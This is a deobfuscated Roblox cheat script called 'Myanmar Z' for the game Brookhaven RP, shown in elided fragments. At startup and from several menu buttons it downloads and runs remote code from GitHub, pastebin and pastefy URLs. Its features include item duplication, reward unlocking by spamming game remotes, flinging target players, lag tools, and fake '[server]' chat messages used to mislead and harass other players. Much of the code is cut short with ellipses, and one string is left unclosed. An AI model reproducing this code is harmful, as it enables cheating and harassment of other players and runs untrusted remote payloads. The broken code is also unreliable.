-- DEOBFUSCATED BY LORD SUDO --

local function obf_adjnqwidqwjhdpoq()
	local function obf_wrapperfunc(obf_arg)
		if obf_arg then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/icos/refs/heads/main/skibidisigma.lua"))();
			args = {
				[1] = "RolePlayName",
				[2] = "Myanmar Z"
			};
			...
			game:GetService("StarterGui"):SetCore("SendNotification", {
				["Title"] = "Myanmar Z,
				["Text"] = "First Myanmar Script",
				["Duration"] = 10
			});
			if (game.placeId == 4924922222) then
				local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/sanderxnewUISUPER/refs/heads/main/oriontest"))();
				local exploitName = getexecutorname() or "Executor" ;
				local Window = OrionLib:MakeWindow({
					["Name"] = "Myanmr Z | Brookhaven RP | Executor: "   .. exploitName ,
					["HidePremium"] = false,
					["SaveConfig"] = false,
					["IntroText"] = "| Myanmar Z |",
					["IntroIcon"] = "rbxassetid://96468905050182",
				...
				Tab:AddParagraph("Myanmar X V4.95 ", "I'm XNE0K, the owner of the script. Thank you for using it");
				Tab:AddParagraph(" Myanmar Z UPDATE", " V4.95 Vip🥚");
				Tab:AddParagraph("What New?", "Event Update Back!, Unlocker Baby Easy Medium Hard And Extreme added, Improved Skin Ready Better to use :), Added Horror Skins to ready skins, Easter Skins added to event Update, added easter car spam");
				Tab:AddButton({
					["Name"] = "Roblox",
					["Callback"] = function()
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						setclipboard("https://www.youtube.com/@Bloxfruit-v8s");
					end
				});
				Tab = Window:MakeTab({
					["Name"] = "Event Update",
					...
					["Callback"] = function()
						...
						while true do
							if (FlatIdent_10BCC == 2) then
								chatMessage(":)"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "[server] Happy Easter!" );
								break;
							end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_60EA1;
						while true do
							if (FlatIdent_25011 == 0) then
								FlatIdent_60EA1 = 0;
								while true do
									if (FlatIdent_60EA1 == 0) then
										game:GetService("ReplicatedStorage").Remotes.ChangeDifficulty:FireServer("Baby");
										for i = 1, 10 do
											local FlatIdent_8F047 = 0;
											local FlatIdent_31A5A;
											while true do
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_31905;
						while true do
							if (FlatIdent_1BCFB == 0) then
								FlatIdent_31905 = 0;
								while true do
									if (0 == FlatIdent_31905) then
										game:GetService("ReplicatedStorage").Remotes.ChangeDifficulty:FireServer("Easy");
										for i = 1, 15 do
											local FlatIdent_7FAC9 = 0;
											local FlatIdent_726FD;
											while true do
												if (0 == FlatIdent_7FAC9) then
													FlatIdent_726FD = 0;
													while true do
														if (0 == FlatIdent_726FD) then
															game:GetService("ReplicatedStorage").Remotes.EggCollected:InvokeServer();
															game:GetService("StarterGui"):SetCore("SendNotification", {
																["Title"] = "Easter Unlocker",
																["Text"] = "You got "   .. i ,
							...
							if (FlatIdent_40CF == 0) then
								...
								while true do
									if (FlatIdent_51F42 == 0) then
										game:GetService("ReplicatedStorage").Remotes.ChangeDifficulty:FireServer("Medium");
										for i = 1, 20 do
											local FlatIdent_1BCFB = 0;
											while true do
							...
							if (FlatIdent_8CEDF == 0) then
								...
								while true do
									if (0 == FlatIdent_27957) then
										game:GetService("ReplicatedStorage").Remotes.ChangeDifficulty:FireServer("Hard");
										for i = 1, 25 do
											local FlatIdent_33EA4 = 0;
											local FlatIdent_48C5F;
											while true do
												if (FlatIdent_33EA4 == 0) then
													FlatIdent_48C5F = 0;
													while true do
														if (FlatIdent_48C5F == 1) then
															wait(0.5);
															break;
														end
														if (FlatIdent_48C5F == 0) then
				...
				Tab:AddButton({
					["Name"] = "Unlock Extreme",
					["Callback"] = function()
						local FlatIdent_5061C = 0;
						while true do
							if (FlatIdent_5061C == 0) then
								game:GetService("ReplicatedStorage").Remotes.ChangeDifficulty:FireServer("Extreme");
								for i = 1, 35 do
				...
				local function requestCarModels()
					while isRunning do
						for _, carModel in ipairs(carModels) do
				...
				local function startRequestingCarModels()
				...
				local function stopRequestingCarModels()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Easter Car",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startRequestingCarModels();
						else
							stopRequestingCarModels();
						end
					end
				});
				local Section = Tab:AddSection({
						...
						while true do
							...
							if (FlatIdent_33EA4 == 2) then
								function RemoveAllItems()
									...
									local FlatIdent_7A0C2;
									while true do
										if (FlatIdent_207CC == 0) then
											FlatIdent_7A0C2 = 0;
											while true do
												if (FlatIdent_7A0C2 == 1) then
												...
												if (FlatIdent_7A0C2 == 2) then
													desc = humanoid:GetAppliedDescription();
													event = ReplicatedStorage:FindFirstChild("RE");
													FlatIdent_7A0C2 = 3;
												end
												if (FlatIdent_7A0C2 == 4) then
													for _, category in ipairs(accessories) do
														if category then
															for id in string.gmatch(category, "%d+") do
																Wear(tonumber(id));
															end
														end
													end
												...
												if (FlatIdent_7A0C2 == 3) then
													...
													while true do
														...
														if (FlatIdent_5477B == 0) then
															if (event and event:FindFirstChild("1Avata1rOrigina1l")) then
																event["1Avata1rOrigina1l"]:FireServer("CharacterChange", {
																	desc.Torso,
																	desc.RightArm,
																	desc.LeftArm,
																	desc.RightLeg,
										...
										if (FlatIdent_7F121 == 0) then
											...
											while true do
												if (FlatIdent_39EBF == 0) then
													event = ReplicatedStorage:FindFirstChild("RE");
													if (event and event:FindFirstChild("1Updat1eAvata1r")) then
														event["1Updat1eAvata1r"]:FireServer("wear", id);
													end
													break;
												end
											end
							...
							if (FlatIdent_33EA4 == 3) then
								...
								for _, itemID in ipairs(skins[Value] or {} ) do
				...
				local function populateDropdown()
					...
					local FlatIdent_660AE;
					while true do
						if (FlatIdent_5F1CB == 0) then
							FlatIdent_660AE = 0;
							while true do
								if (FlatIdent_660AE == 1) then
									Dropdown:Refresh(playersList, true);
									break;
								end
								if (FlatIdent_660AE == 0) then
					...
					["Callback"] = function()
						...
						if  not PCar then
							if (RootPart and Target) then
								local FlatIdent_5D525 = 0;
								local Seat;
								while true do
									if (FlatIdent_5D525 == 3) then
										Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat") ;
										if Seat then
											repeat
												local FlatIdent_6A091 = 0;
												local FlatIdent_64E40;
												while true do
											...
											if (FlatIdent_8B523 == 1) then
												...
												while true do
													...
													if (FlatIdent_20FE3 == 0) then
														kill(TargetRP, CFrame.new(0, 1, 0) + ((TargetH.MoveDirection * TargetRP.Velocity.Magnitude) / 1.05) , CFrame.Angles(math.rad(Angles), 0, 0));
														kill(TargetRP, CFrame.new(0, -2.25, 5) + ((TargetH.MoveDirection * TargetRP.Velocity.Magnitude) / 1.05) , CFrame.Angles(math.rad(Angles), 0, 0));
														FlatIdent_20FE3 = 1;
													end
												end
											end
											if (2 == FlatIdent_8B523) then
												kill(TargetRP, CFrame.new(0, 2.25, 0.25) + ((TargetH.MoveDirection * TargetRP.Velocity.Magnitude) / 1.1) , CFrame.Angles(math.rad(95), 0, 0));
												kill(TargetRP, CFrame.new( -2.25, -1.5, 2.25) + ((TargetH.MoveDirection * TargetRP.Velocity.Magnitude) / 1.1) , CFrame.Angles(math.rad(45), 0, 0));
												FlatIdent_8B523 = 3;
											end
				...
				local function updatePlayersList()
					...
					local FlatIdent_1C6E6;
					local vehiclesFolder;
					while true do
							...
							while true do
								if (FlatIdent_1C6E6 == 1) then
									if vehiclesFolder then
															...
															if (FlatIdent_2A9F7 == 1) then
																while true do
																	if (FlatIdent_98388 == 0) then
																		playerCar = vehiclesFolder:FindFirstChild(p.Name   .. "Car" );
																		if playerCar then
										...
										warn("Folder 'Vehicles' not found in workspace!");
									end
									break;
								end
													...
													if vehiclesFolder then
														...
														while true do
															if (FlatIdent_62832 == 0) then
																targetVehicle = vehiclesFolder:FindFirstChild(targetPlayer.Name   .. "Car" );
																if (targetVehicle and targetVehicle:IsA("Model")) then
																	...
																	while true do
																		if (FlatIdent_5724B == 1) then
																			while true do
																				if (FlatIdent_882F4 == 0) then
																					primaryPart = targetVehicle.PrimaryPart or targetVehicle:FindFirstChild("PrimaryPart") ;
																					if primaryPart then
																						local FlatIdent_3CF01 = 0;
																						while true do
																							if (FlatIdent_3CF01 == 1) then
																								game:GetService("StarterGui"):SetCore("SendNotification", {
																									["Title"] = "Teleported to vehicle:",
																									["Text"] = targetPlayer.Name   .. "Car" ,
																									["Duration"] = 3
																								});
																								break;
																							end
																							if (FlatIdent_3CF01 == 0) then
																								game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(primaryPart.CFrame + Vector3.new(0, 5, 0) );
																								print("Teleported to vehicle: "   .. targetPlayer.Name   .. "Car" );
																								FlatIdent_3CF01 = 1;
																							end
																						end
																					else
																	...
																	while true do
																		if (0 == FlatIdent_43626) then
																			...
																			warn("Vehicle not found: "   .. targetPlayer.Name   .. "Car" );
																			break;
																		end
																	end
																end
				...
				Tab:AddButton({
					["Name"] = "Get Horse (YOU NEED THIS AND CLICK 1)",
					["Callback"] = function()
						local FlatIdent_21DDC = 0;
						local args;
						while true do
								...
								if (FlatIdent_32BB2 == 0) then
									...
									while true do
										...
										if (FlatIdent_3ACCC == 0) then
											personagem = game.Players.LocalPlayer.Character;
											altura = 10;
											FlatIdent_3ACCC = 1;
										end
									end
													...
													if (FlatIdent_67F21 == 2) then
														while true do
															if (FlatIdent_2DA99 == 1) then
																novaCFrame = CFrame.new(novaPosicao) * CFrame.Angles(math.rad(90), 0, 0) ;
															...
															if (FlatIdent_2DA99 == 0) then
																...
																while true do
																	...
																	if (FlatIdent_3F15E == 0) then
																		posicaoAtual = personagem.HumanoidRootPart.Position;
																		novaPosicao = Vector3.new(posicaoAtual.X, posicaoAtual.Y + altura , posicaoAtual.Z);
																		FlatIdent_3F15E = 1;
																	end
																end
															end
				...
				Tab:AddButton({
					["Name"] = "Duplicate Fire Extinguishers (Need this for lag)",
					["Callback"] = function()
						local args = {
							[1] = "CharacterChange",
							[2] = {
						...
						game:GetService("StarterGui"):SetCore("SendNotification", {
							["Title"] = "Dupe Script",
							["Text"] = "Please do equip any tools or unequip tools or click tools on inventory. ",
						...
						for m = 1, 2 do
							...
							local FlatIdent_43748;
							while true do
								if (FlatIdent_5077 == 0) then
									FlatIdent_43748 = 0;
									while true do
										if (FlatIdent_43748 == 0) then
											task.wait();
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
											break;
										end
									end
									break;
						...
						for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
							if toollel:IsA("Tool") then
								if (toollel.Name == toolselcted) then
									...
									local FlatIdent_7AA10;
									while true do
										if (FlatIdent_6EF7B == 0) then
											FlatIdent_7AA10 = 0;
											while true do
												if (FlatIdent_7AA10 == 0) then
													toollllfoun2 = true;
						...
						if (toollllfoun == true) then
							...
							local FlatIdent_73409;
							while true do
								if (FlatIdent_2F298 == 0) then
									FlatIdent_73409 = 0;
									while true do
										if (1 == FlatIdent_73409) then
											toollllfoun = false;
											break;
										end
										if (FlatIdent_73409 == 0) then
									...
									while true do
										...
										if (FlatIdent_12DD == 0) then
											...
											if (m <= dupeamot) then
												game:GetService("StarterGui"):SetCore("SendNotification", {
													["Title"] = "Dupe Script",
													["Text"] = "Now you got"   .. " "   .. m   .. " "   .. "Duped"   .. " "   .. toolselcted   .. "!" ,
													["Duration"] = 0.5
												});
											elseif ((m == dupeamot) or (m >= (dupeamot - 1))) then
												game:GetService("StarterGui"):SetCore("SendNotification", {
													["Title"] = "Dupe Script",
													["Text"] = "Now you got"   .. " "   .. m   .. " "   .. "Duped"   .. " "   .. toolselcted   .. "!"   .. " "   .. "Duping tools is done now, Please wait a little bit to respawn." ,
													["Duration"] = 4
												});
											end
											args = {
						...
						game:GetService("StarterGui"):SetCore("SendNotification", {
							["Title"] = "Dupe Script",
							["Text"] = "Done, Now you have"   .. " "   .. toolamouth   .. " "   .. "duped"   .. " "   .. toolselcted ,
							["Duration"] = 7.5
						});
						wait();
						duping = false;
				...
				function toggleView(enabled)
					if enabled then
						if selectedViewPlayer then
							...
							local FlatIdent_20A1F;
							local player;
							while true do
								if (FlatIdent_87441 == 1) then
									while true do
										if (FlatIdent_20A1F == 0) then
				...
				function findPlayerByPartialNameOrNickname(partialName)
					local FlatIdent_73F66 = 0;
					local FlatIdent_6D20D;
					local partial;
					while true do
										...
										if (FlatIdent_6D20D == 0) then
											...
											while true do
												...
												if (FlatIdent_47A85 == 0) then
													partial = partialName:sub(1, 2):lower();
													for _, player in ipairs(game.Players:GetPlayers()) do
				...
				Tab:AddButton({
					["Name"] = "Field of View Fov Start to 100",
					["Callback"] = function()
						loadstring(game:HttpGet("https://pastefy.app/W1XFQiHe/raw"))();
					end
				});
				Tab:AddButton({
					["Name"] = "Field of View Fov Start to 5",
					["Callback"] = function()
						loadstring(game:HttpGet("https://pastefy.app/h0TXONoO/raw"))();
					end
				});
				Section = Tab:AddSection({
					["Name"] = "illusion"
						...
						while isIllusionV20Enabled do
							...
							while true do
								if (FlatIdent_94CF9 == 0) then
									...
									game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(teleportSpeed), {
										["CFrame"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
									}):Play();
									FlatIdent_94CF9 = 1;
								end
								...
								if (FlatIdent_94CF9 == 2) then
									game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1 / rotateSpeed ), {
										["CFrame"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(90), math.rad(180), math.rad(270))
									}):Play();
									wait(1 / rotateSpeed );
									break;
								end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_75B0;
						local args;
						while true do
							if (FlatIdent_19FC0 == 1) then
								while true do
									if (FlatIdent_75B0 == 1) then
										args = {
											[1] = "wear",
											[2] = 6564572490
										};
				...
				Tab:AddButton({
					["Name"] = "Telekinesis",
					["Callback"] = function()
						loadstring(game:HttpGet("https://pastebin.com/raw/h4VWC9dc"))();
					end
				});
				Tab:AddButton({
					["Name"] = "Give Btools",
					["Description"] = "Gives Btools to the player's inventory (Hammer and Copy Btool)",
					["Callback"] = function()
						local hammer = Instance.new("HopperBin");
						hammer.Name = "Hammer";
						hammer.BinType = "Hammer";
						hammer.Parent = game.Players.LocalPlayer.Backpack;
						local copyBTool = Instance.new("HopperBin");
						copyBTool.Name = "CopyBTool";
						copyBTool.BinType = "Clone";
						copyBTool.Parent = game.Players.LocalPlayer.Backpack;
					end
				});
				Tab:AddButton({
					["Name"] = "Tool Giver (not FE)",
					["Callback"] = function()
				...
				Tab:AddButton({
					["Name"] = "Click Teleport",
					["Callback"] = function()
						loadstring(game:HttpGet("https://pastefy.app/Ro0n1K3w/raw"))();
					end
				});
				Tab:AddButton({
					["Name"] = "Drop Item script",
					["Callback"] = function()
						...
						while true do
							if (FlatIdent_8C894 == 5) then
								...
								while true do
									...
									if (FlatIdent_5EF9 == 3) then
										Version.Text = "Script for dropping items. Version: 2.";
										Version.TextColor3 = Color3.fromRGB(0, 0, 0);
										FlatIdent_5EF9 = 4;
									end
									if (FlatIdent_5EF9 == 4) then
										FlatIdent_8C894 = 6;
										break;
									end
							...
							if (FlatIdent_8C894 == 7) then
								...
								Cred.Text = "Script made by: Wojtes_BMW";
							...
							if (FlatIdent_8C894 == 0) then
								...
								while true do
									...
									if (FlatIdent_6719E == 2) then
										...
										Cred = Instance.new("TextButton");
										FlatIdent_6719E = 3;
									end
									if (FlatIdent_6719E == 1) then
										DropTool = Instance.new("TextButton");
										Equip = Instance.new("TextButton");
										FlatIdent_6719E = 2;
									end
								end
							end
								...
								if gravity then
									...
									while true do
										if (FlatIdent_85E0E == 0) then
											...
											print("Gravity adjusted to:", gravity);
											break;
										end
									end
								else
									print("Please enter a valid numeric value for the severity.");
								end
								break;
							end
						end
				...
				Tab:AddParagraph("NOTE!", "Updated! Fixed! :)");
				Tab:AddDropdown({
					["Name"] = "SCP Skins (designer: AntekWoszszczczek):",
					["Default"] = "",
					["Options"] = {
						"Cloud-9",
						"Nu-7",
				...
				Tab:AddDropdown({
					["Name"] = "Meme Skins (designer: AntekWoszszczczek):",
					["Default"] = "",
					["Options"] = {
						"Golden TrollFace",
						"Delux Rock",
				...
				Tab:AddDropdown({
					["Name"] = "Horror Skins (designer By Wojtes_BMW):",
					["Default"] = "",
					["Options"] = {
						"Jeff The Killer",
						"Black Eye",
								...
								while true do
									...
									if (FlatIdent_32B1C == 0) then
										if  not remoteEvent then
											...
											local FlatIdent_90FDB;
											while true do
												if (FlatIdent_70FF0 == 0) then
													FlatIdent_90FDB = 0;
													while true do
														if (FlatIdent_90FDB == 0) then
															warn("Nie znaleziono RemoteEvent: 1Clea1rTool1s");
															return;
														end
													end
													break;
										...
										auras = {
											["White Aura"] = "0002FreeWhite",
											["Yellow Aura"] = "0003FreeYellow",
											["Orange Aura"] = "0004FreeOrange",
											["Green Aura"] = "0005FreeGeen",
											["Blue Aura"] = "0006FreeBlue",
											["Purple Aura"] = "0007FreePurple",
											["Pink Aura"] = "0008FreePink",
											["Red Aura"] = "0009FreeRed"
										};
										FlatIdent_32B1C = 1;
									end
								end
							...
							if (FlatIdent_16207 == 0) then
								...
								while true do
									if (FlatIdent_2CA66 == 0) then
										ReplicatedStorage = game:GetService("ReplicatedStorage");
										remoteEvent = ReplicatedStorage:FindFirstChild("RE"):FindFirstChild("1Clea1rTool1s");
										FlatIdent_2CA66 = 1;
									end
									...
									if (0 == FlatIdent_7E5C9) then
										...
										while true do
											...
											if (FlatIdent_2CB11 == 0) then
												ReplicatedStorage = game:GetService("ReplicatedStorage");
												remoteEvent = ReplicatedStorage:FindFirstChild("RE"):FindFirstChild("1Updat1eAvata1r");
												FlatIdent_2CB11 = 1;
											end
										end
									end
									if (FlatIdent_7E5C9 == 2) then
										if skins[Value] then
											local FlatIdent_6E9BC = 0;
											local FlatIdent_8E3FD;
											local args;
											while true do
							...
							if (1 == FlatIdent_1D2C3) then
								...
								while true do
									if (FlatIdent_2394 == 0) then
										...
										characters = {
											["Jeff The Killer"] = 14502327402,
											["Siren Head"] = 15133314794,
											["Smile Dog"] = 14761007249,
											["Mario Victim 1"] = 14732524763,
											["Jermas Eyes"] = 14817978441,
											["SCP-096"] = 14952594200,
											["Scary Girl"] = 14567023223,
											["AYUWOKI"] = 17215935156,
											["Eyes"] = 14701936208,
											["Phen-228"] = 17289564307
										};
										FlatIdent_2394 = 1;
									end
					...
					["Callback"] = function(Value)
						...
						while true do
							if (1 == FlatIdent_64E47) then
										...
										if (FlatIdent_202CC == 0) then
											...
											while true do
												if (FlatIdent_30F3D == 0) then
													warn("Nie znaleziono RemoteEvent: 1Updat1eAvata1r");
													return;
												end
											end
										end
								...
								characters = {
									["cashOh Bro"] = 17040765338,
									["Nikocado Avocado"] = 15036970502,
									["Shrek"] = 15105007162,
									["Arab WallTuh"] = 14605941742,
									["Sigma Dog"] = 17198646013,
									["Black Man"] = 17378489658,
									["Socked Guy"] = 14952570512,
									["Sussy Dog"] = 17253063048,
									["Dog Meme"] = 14753332139,
									["Looksmaxing"] = 17803036342,
									["Dr cheatson"] = 18254304785,
									["Pig Explosion"] = 17678916331,
									["Tyler"] = 17327750447,
									["Kai cenat"] = 15588677056,
									["Chipi chipi Cat"] = 15696360871,
									["Super Idol"] = 15228571817,
									["Ronaldo"] = 14967090040
								};
								FlatIdent_64E47 = 2;
							end
											...
											for i = 0, openingTime / animFramerate  do
												...
												while true do
													if (FlatIdent_61F8A == 0) then
														alpha = i / (openingTime / animFramerate) ;
											...
											for i = 0, closingTime / animFramerate  do
												...
												while true do
													...
													if (FlatIdent_97A1A == 0) then
														alpha = i / (closingTime / animFramerate) ;
														BlurFrame.Transparency = 0.5 + (alpha / 2) ;
														FlatIdent_97A1A = 1;
													end
													if (2 == FlatIdent_97A1A) then
				...
				Section = Tab:AddSection({
					["Name"] = "Server Prank *VERY OP*"
				});
				Tab:AddButton({
					["Name"] = "Text: [server] Chat Cleared ",
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_630B0 == 2) then
								chatMessage(":)"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "[server] Chat Cleared" );
								break;
							end
				...
				Tab:AddButton({
					["Name"] = "Text: [server] The Globglogabgalab ",
					["Callback"] = function()
						...
						while true do
							if (FlatIdent_65A72 == 1) then
								function chatMessage(str)
									local FlatIdent_54AE6 = 0;
									while true do
										if (FlatIdent_54AE6 == 0) then
											str = tostring(str);
											if (TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) then
												TextChatService.TextChannels.RBXGeneral:SendAsync(str);
											else
							...
							if (FlatIdent_65A72 == 2) then
								chatMessage(":)"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "[server] The Globglogabgalab" );
								break;
							end
						end
					end
					...
					["Callback"] = function()
						...
						while true do
							...
							if (2 == FlatIdent_94366) then
								chatMessage(":)"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "Sȇẋ" );
								break;
							end
						end
					end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_55482 == 2) then
								chatMessage(":)"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. 